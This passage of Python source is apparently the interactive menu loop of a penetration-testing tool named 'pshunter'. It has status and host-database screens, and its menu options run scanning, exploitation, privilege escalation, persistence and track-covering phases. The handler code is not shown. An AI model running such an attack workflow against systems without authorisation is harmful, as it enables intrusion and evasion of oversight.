    context passed to ``handle``. ``handle(ctx, v)`` returns 'refresh' to redraw the
    screen or 'stay' to just re-prompt WITHOUT redrawing — so an invalid option / typo
    doesn't reprint the whole view, only the bare prompt shows again. b / back / /exit
    leave. The options hint shows on the first prompt after a redraw, then bare."""
    first = True
    while True:
        if not first:
            _hr()
        first = False
        ctx = render()
        with_opts = True
        while True:
            v = _ctx_ask(module, options if with_opts else "")
            with_opts = False
            if v is None or v.lower() in _BACK_WORDS:
                return
            action = handle(ctx, v.strip().lower()) if handle else "stay"
            if action == "refresh":
                break                             # redraw the screen
            # 'stay' → re-prompt (bare), screen not redrawn


def _view(render, module: str, options: str = "[b] back") -> None:
    """Static screen (e.g. help): drawn once, kept open until the user goes back."""
    _run_view(module, options, render)


def _status_view() -> None:
    """Status screen: refresh, view a scan's command + output in a spawned terminal
    (``v <n>``), stop a running scan (``stop <n>``), or clear finished history."""
    def _handle(jobs, v):
        if v == "":
            return "refresh"
        if v == "c":
            _clear_status()
            return "refresh"
        if v.startswith("stop"):
            rest = v[len("stop"):].strip()
            if rest.isdigit():
                _stop_job(jobs, int(rest))
                return "refresh"
            print(f"{RED}✗ use: stop <n>{RESET}")
            return "stay"
        if v.startswith("v"):
            rest = v[1:].strip()
            if rest.isdigit():
                _view_command(jobs, int(rest))
            else:
                print(f"{RED}✗ use: v <n>{RESET}")
            return "stay"
        if v.isdigit():
            _stop_job(jobs, int(v))
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— v <n> · stop <n> · c · b · enter{RESET}")
        return "stay"

    _run_view("status", "[Enter] refresh · v <n> view · stop <n> abort · [c] clear · [b] back",
              show_status, _handle)


def _database_view() -> None:
    """Database screen: host list; type a host number to see its ports/services,
    ``r <n>`` to remove a host, ``c`` to clear, ``b`` to go back."""
    def _handle(rows, v):
        if v == "":
            return "refresh"
        if v == "c":
            clear_database()
            return "refresh"
        if v.startswith("r"):
            rest = v[1:].strip()
            if rest.isdigit():
                _delete_host(rows, int(rest))
                return "refresh"
            print(f"{RED}✗ use: r <n>{RESET}")
            return "stay"
        if v.isdigit():
            _host_ports_view(rows, int(v))
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · r <n> · c · b · enter{RESET}")
        return "stay"

    _run_view("database",
              "[Enter] refresh · <n> select · r <n> remove · [c] clear · [b] back",
              show_database, _handle)


# ── main loop ─────────────────────────────────────────────────────────────────
def main() -> int:
    if any(a in ("-h", "--help") for a in sys.argv[1:]):
        print_help()      # `pshunter -h/--help` (also used by `pshelp pshunter`)
        return 0
    print_header()
    if os.path.exists(DB_PATH):        # apply any pending schema migrations up front
        with _DB_LOCK:
            _db_connect().close()      # (so raw reads like fetch_hosts see new columns)
    _load_jobs()          # restore the saved command history
    _reconcile_hosts_on_start()          # clear any /etc/hosts residue from a prior session
    atexit.register(_remove_all_pshunter_hosts)   # best-effort cleanup on a graceful exit
    try:
        while True:
            print_menu()
            while True:                       # prompt loop: a typo re-prompts bare, the
                try:                          # menu is only reprinted after a real action
                    choice = input(f"{BOLD}{CYAN}[menu]{RESET}{DIM} ›{RESET} ").strip().lower()
                except (EOFError, KeyboardInterrupt):
                    print(f"\n{DIM}bye.{RESET}")
                    return 0

                if choice in ("/exit", "\\exit", "exit", "q", "quit"):
                    print(f"{DIM}bye.{RESET}")
                    return 0
                try:
                    if choice in _HELP_WORDS:
                        _view(print_help, "help")
                    elif choice == "0":
                        _handle_host_discovery()
                    elif choice == "1":
                        _handle_port_enum()
                    elif choice == "2":
                        _handle_service_detection()
                    elif choice == "3":
                        _handle_vuln_scan()
                    elif choice == "4":
                        _handle_cve_lookup()
                    elif choice == "5":
                        _handle_service_exploitation()
                    elif choice == "6":
                        _handle_privesc()
                    elif choice == "7":
                        _handle_persist()
                    elif choice == "8":
                        _handle_cover()
                    elif choice in _PHASES:
                        run_phase(choice)
                    elif choice in ("s", "status"):
                        _status_view()
                    elif choice in ("d", "database"):
                        _database_view()
                    elif choice in ("n", "new"):
                        new_session()
                    elif choice in ("u", "upgrade") and not _is_root():
                        _upgrade_to_root()
                    elif choice in _MENU_WORDS:
                        pass                  # already at the menu → just redraw it
                    else:
                        print(f"{RED}✗ pick 0-8, s, d, n, h or /exit{RESET}")
                        continue              # invalid → bare re-prompt, menu not reprinted
                except _ToMenu:               # m/menu typed inside a sub-view → back here
                    pass
                break                         # a valid action ran → redraw the menu

            print(f"{DIM}{'─' * 56}{RESET}\n")
    except _ExitApp:          # /exit typed at any sub-prompt
        print(f"\n{DIM}bye.{RESET}")
        return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        sys.exit(130)
